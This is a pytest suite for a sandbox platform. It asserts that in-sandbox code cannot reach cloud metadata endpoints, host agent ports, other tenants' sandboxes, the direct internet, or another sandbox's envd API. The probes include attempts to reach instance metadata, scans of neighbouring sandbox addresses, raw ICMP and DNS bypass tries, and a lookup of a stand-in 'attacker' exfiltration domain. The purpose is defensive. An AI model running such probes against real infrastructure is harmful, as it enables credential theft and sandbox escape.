"""Network escapes: every attempt must fail to exchange data."""
import os
import textwrap

import httpx

import pytest
from e2b import Sandbox

from conftest import run_py

# Connects, sends a probe and reports whether the destination answered. The
# sandbox's connect() may succeed (the host intercepts every connection), and
# the egress gateway answers plain-HTTP probes with its own refusal, marked
# with `x-weft-egress-reason`; neither counts as reaching the destination.
PROBE = textwrap.dedent(
    """
    import socket, sys
    def probe(host, port, payload=b"GET / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n", family=socket.AF_INET):
        try:
            s = socket.socket(family, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.sendall(payload)
            data = b""
            while len(data) < 4096:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except OSError:
            data = b""
        if b"x-weft-egress-reason" in data.lower():
            return b""
        return data[:64]
    """
)


def reached(sbx, host, port, family="socket.AF_INET"):
    code, out, err = run_py(sbx, PROBE + f"\nprint(repr(probe({host!r}, {port}, family={family})))")
    assert code == 0, err
    return out.strip() not in ("b''", "")


@pytest.mark.parametrize(
    "host,port",
    [
        ("169.254.169.254", 80),  # EC2 instance metadata
        ("169.254.170.2", 80),  # ECS task metadata
        ("169.254.169.253", 53),  # VPC DNS resolver over TCP
        ("169.254.0.22", 5007),  # host agent API via the guest gateway
        ("169.254.0.22", 5008),  # host agent tunnel via the guest gateway
        ("127.0.0.1", 5007),  # loopback is the guest's own
    ],
)
def test_metadata_and_host_services_are_unreachable(attacker, host, port):
    assert not reached(attacker, host, port), f"{host}:{port} answered"


def test_imds_over_ipv6_is_unreachable(attacker):
    assert not reached(attacker, "fd00:ec2::254", 80, "socket.AF_INET6")


def test_host_vpc_address_is_unreachable(attacker):
    host_ip = os.environ.get("WEFT_ESCAPE_HOST_IP")
    if not host_ip:
        pytest.skip("set WEFT_ESCAPE_HOST_IP to probe the host's VPC address")
    for port in (22, 5007, 5008, 15000, 15001, 15053):
        assert not reached(attacker, host_ip, port), f"host port {port} answered"


def test_other_sandboxes_are_unreachable(attacker):
    victim = Sandbox.create(metadata={"suite": "escape"}, timeout=120)
    try:
        victim.commands.run("python3 -m http.server 9000 --bind 0.0.0.0", background=True)
        # Slot addresses on the host side of every sandbox's link.
        targets = [f"10.200.0.{i}" for i in range(1, 64)]
        code, out, err = run_py(
            attacker,
            PROBE + f"\nhits=[h for h in {targets!r} for p in (9000, 49983) if probe(h, p)]\nprint(hits)",
            timeout=300,
        )
        assert code == 0, err
        assert out.strip() == "[]", f"reached other sandboxes: {out}"
    finally:
        victim.kill()


def test_no_direct_internet(attacker):
    for host, port in [("1.1.1.1", 443), ("8.8.8.8", 53), ("93.184.215.14", 80)]:
        assert not reached(attacker, host, port), f"{host}:{port} answered"
    assert not reached(attacker, "2606:4700:4700::1111", 443, "socket.AF_INET6")


def test_udp_icmp_and_dns_bypass_get_no_answer(attacker):
    code, out, err = run_py(
        attacker,
        textwrap.dedent(
            """
            import socket, struct
            answers = []
            # DNS straight to a public resolver, bypassing the guest resolver.
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(3)
            q = b"\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01"
            for target in [("8.8.8.8", 53), ("1.1.1.1", 443), ("169.254.169.253", 53)]:
                try:
                    u.sendto(q, target)
                    resp = u.recv(512)
                    # DNS to any address is answered by the guest resolver; only
                    # a reply carrying answer records would be a bypass.
                    if len(resp) >= 8 and struct.unpack("!H", resp[6:8])[0] > 0:
                        answers.append(("udp", target, resp[:12]))
                except OSError:
                    pass
            # ICMP echo with a raw socket (root has CAP_NET_RAW in the guest).
            try:
                r = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP); r.settimeout(3)
                body = b"\\x08\\x00\\x00\\x00\\x00\\x01\\x00\\x01"
                csum = sum(struct.unpack("!4H", body)); csum = ~((csum >> 16) + (csum & 0xffff)) & 0xffff
                r.sendto(b"\\x08\\x00" + struct.pack("!H", csum) + body[4:], ("1.1.1.1", 0))
                answers.append(("icmp", r.recv(64)[:4]))
            except OSError:
                pass
            print(answers)
            """
        ),
    )
    assert code == 0, err
    assert out.strip() == "[]", f"got answers: {out}"


def test_dns_answers_nothing_outside_the_policy(attacker):
    code, out, _ = run_py(attacker, "import socket\nfor n in ['example.com','exfil-1234.attacker.invalid','localhost.localdomain.x']:\n    try:\n        print(socket.gethostbyname(n))\n    except OSError:\n        pass")
    assert out.strip() == "", f"resolved: {out}"


def _envd(sbx_id, path, token=None):
    """Calls a sandbox's envd through the edge proxy, like the SDK does."""
    headers = {"content-type": "application/json", "connect-protocol-version": "1"}
    if token:
        headers["x-access-token"] = token
    base = os.environ.get("E2B_SANDBOX_URL")
    if base:
        headers.update({"E2b-Sandbox-Id": sbx_id, "E2b-Sandbox-Port": "49983"})
        url = base.rstrip("/") + path
    else:
        url = f"https://49983-{sbx_id}.{os.environ['E2B_DOMAIN']}{path}"
    with httpx.Client(trust_env=False, verify=os.environ.get("SSL_CERT_FILE", True), timeout=20) as c:
        return c.post(url, headers=headers, content=b"{}")


def test_envd_rejects_missing_and_foreign_tokens(attacker):
    other = Sandbox.create(metadata={"suite": "escape"}, timeout=60)
    try:
        own = attacker._envd_access_token  # the token the SDK received at create
        assert _envd(attacker.sandbox_id, "/process.Process/List", own).status_code == 200
        assert _envd(attacker.sandbox_id, "/process.Process/List").status_code == 401
        assert _envd(attacker.sandbox_id, "/process.Process/List", other._envd_access_token).status_code == 401
        # The token cannot be reset from outside: /init never reaches envd.
        assert _envd(attacker.sandbox_id, "/init", "x" * 32).status_code == 404
    finally:
        other.kill()
